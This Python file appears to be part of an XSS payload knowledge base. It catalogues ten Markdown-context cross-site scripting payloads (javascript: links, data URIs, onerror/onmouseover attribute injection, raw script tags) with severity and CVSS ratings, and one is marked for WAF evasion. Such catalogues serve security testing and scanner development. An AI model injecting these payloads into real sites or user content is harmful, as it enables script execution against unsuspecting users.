#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

Markdown Context XSS Payloads
"""

from ..models import PayloadEntry


MARKDOWN_XSS_PAYLOADS = {
    "md_link_1": PayloadEntry(
        payload="[Click](javascript:alert(1))",
        contexts=["markdown"],
        severity="high",
        cvss_score=7.5,
        description="Markdown link with javascript",
        tags=["markdown", "link", "javascript"],
        reliability="medium",
    ),
    "md_link_2": PayloadEntry(
        payload="[Click](javascript:alert`1`)",
        contexts=["markdown"],
        severity="high",
        cvss_score=7.5,
        description="Markdown link with template literal",
        tags=["markdown", "link", "javascript", "template-literal"],
        waf_evasion=True,
        reliability="medium",
    ),
    "md_link_3": PayloadEntry(
        payload="[Click](data:text/html,<script>alert(1)</script>)",
        contexts=["markdown"],
        severity="critical",
        cvss_score=8.5,
        description="Markdown link with data URI",
        tags=["markdown", "link", "data-uri"],
        reliability="medium",
    ),
    "md_img_1": PayloadEntry(
        payload='![alt](https://evil.com/x.png"onmouseover="alert(1))',
        contexts=["markdown"],
        severity="high",
        cvss_score=7.0,
        description="Markdown image attribute injection",
        tags=["markdown", "image", "attribute"],
        reliability="medium",
    ),
    "md_img_2": PayloadEntry(
        payload='![alt](x)![alt](x"onerror="alert(1))',
        contexts=["markdown"],
        severity="high",
        cvss_score=7.0,
        description="Markdown image onerror injection",
        tags=["markdown", "image", "onerror"],
        reliability="medium",
    ),
    "md_html_1": PayloadEntry(
        payload="<script>alert(1)</script>",
        contexts=["markdown"],
        severity="critical",
        cvss_score=8.5,
        description="Raw HTML in Markdown",
        tags=["markdown", "html", "raw"],
        reliability="high",
    ),
    "md_html_2": PayloadEntry(
        payload="<img src=x onerror=alert(1)>",
        contexts=["markdown"],
        severity="high",
        cvss_score=7.5,
        description="HTML img in Markdown",
        tags=["markdown", "html", "img"],
        reliability="high",
    ),
    "md_ref_1": PayloadEntry(
        payload="[link][1]\n[1]: javascript:alert(1)",
        contexts=["markdown"],
        severity="high",
        cvss_score=7.5,
        description="Markdown reference link with javascript",
        tags=["markdown", "reference", "javascript"],
        reliability="medium",
    ),
    "md_title_1": PayloadEntry(
        payload='[link](https://evil.com "onclick=alert(1) x=")',
        contexts=["markdown"],
        severity="high",
        cvss_score=7.0,
        description="Markdown link title injection",
        tags=["markdown", "link", "title", "attribute"],
        reliability="medium",
    ),
    "md_autolink_1": PayloadEntry(
        payload="<javascript:alert(1)>",
        contexts=["markdown"],
        severity="high",
        cvss_score=7.5,
        description="Markdown autolink with javascript",
        tags=["markdown", "autolink", "javascript"],
        reliability="low",
    ),
}

MARKDOWN_XSS_PAYLOADS_TOTAL = len(MARKDOWN_XSS_PAYLOADS)
